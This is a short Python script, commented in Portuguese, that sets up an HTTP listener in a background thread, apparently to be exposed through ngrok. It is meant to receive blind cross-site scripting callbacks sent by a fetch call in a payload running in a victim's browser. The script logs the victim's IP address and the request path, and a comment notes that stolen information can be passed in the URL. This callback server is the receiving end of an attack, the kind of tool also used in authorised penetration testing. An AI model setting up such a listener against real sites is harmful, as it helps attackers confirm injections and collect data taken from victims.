import http.server
import socketserver
import threading
from pyngrok import ngrok
import time


# Ela define o que acontece quando um pedido do nosso payload chega.
class XSSRequestHandler(http.server.BaseHTTPRequestHandler):
    # Esta função é chamada automaticamente quando chega um pedido GET (como o do fetch).
    def do_GET(self):
        print("\n[!!!] BLIND XSS CONFIRMADO! Chamada recebida!")
        print(f"[+] O pedido veio de: {self.client_address[0]}")
        print(f"[+] Alvo do pedido: {self.path}") # Podemos até passar info no URL
        
        # Enviamos uma resposta OK para o navegador da vítima.
        self.send_response(200)
        self.end_headers()

# Esta função prepara e inicia o nosso servidor numa thread separada.
def iniciar_servidor_ouvinte(porta):
    # Criamos o servidor com o nosso "atendedor de chamadas".
    servidor = socketserver.TCPServer(("", porta), XSSRequestHandler)
    print(f"[*] Servidor ouvinte iniciado na porta {porta}.")
    
    # Colocamos o servidor para correr numa thread.
    thread_servidor = threading.Thread(target=servidor.serve_forever)
    thread_servidor.daemon = True
    thread_servidor.start()
